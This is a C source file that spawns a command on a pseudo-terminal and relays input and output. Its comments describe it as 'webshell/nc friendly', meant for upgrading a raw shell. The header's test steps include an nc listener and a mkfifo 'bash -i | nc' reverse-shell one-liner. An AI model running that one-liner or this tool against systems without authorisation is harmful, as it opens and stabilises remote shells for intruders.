/*
 * replicate the effect of python's `pty.spawn()` command
 *
 * to build:
 * cc     forkpty.c  -lutil -o forkpty
 *
 * to test:
 * (terminal 1) nc -nvlp 1234
 * (terminal 2) mkfifo foo; cat foo | bash -i | nc 127.0.0.1 1234 > foo
 * (terminal 1) ./forkpty /bin/bash
 *
 * note: errors to stdout and exit(0) to be webshell/nc friendly
 * 
 */

#include <pty.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h> 
#include <sys/time.h>
#include <sys/select.h>
#include <unistd.h>

void die(char *errmsg)
{
  perror(errmsg);
  exit(0);
}

// copy bytes fromfd --> tofd
void copy(int tofd, int fromfd) 
{
  static char buf[8092];
  int nbytes = read(fromfd, buf, 8092);
  switch (nbytes)
  {
    case -1: //error
      die("read");
    case 0: // eof
      exit(0);
    default:
      write(tofd, buf, nbytes);
  }
}

// put terminal into a raw mode.
int setraw(int fd) 
{
  struct termios tp;
  if (tcgetattr(fd, &tp) == -1)
    return -1;
  
  tp.c_iflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);
  tp.c_oflag &= ~OPOST;
  tp.c_cflag &= ~(CSIZE | PARENB);
  tp.c_cflag |= CS8;
  tp.c_lflag &= ~(ECHO | ICANON | ISIG | IEXTEN);
  tp.c_cc[VMIN] = 1;
  tp.c_cc[VTIME] = 0;
  
  return tcsetattr(fd, TCSAFLUSH, &tp);
}


int main(int argc, char **argv)
{
  // stderr --> stdout
  dup2(STDOUT_FILENO, STDERR_FILENO);

  if (argc == 1) // no args provided
  {
    printf("usage: %s cmd [args...]\n", argv[0]);
    return 0;
  }

  // copy args into array for execvp call
  char *args[argc];
  args[argc-1] = NULL;
  for (int i = 1; i < argc; i++)
    args[i-1] = argv[i];

  int terminalfd;

  // fork child process
  switch (forkpty(&terminalfd, NULL, NULL, NULL))
  {
    case -1: // error
      die("forkpty");

    case 0: // child
      execvp(args[0], args);
      die("execvp");

    default: // parent
      while (1)
      {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(terminalfd, &fds);
        FD_SET(STDIN_FILENO, &fds);

        if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) == -1)
          die("select");
        
        if (FD_ISSET(STDIN_FILENO, &fds))
          copy(terminalfd, STDIN_FILENO);
        if (FD_ISSET(terminalfd, &fds))
          copy(STDOUT_FILENO, terminalfd);
      }
  }
}
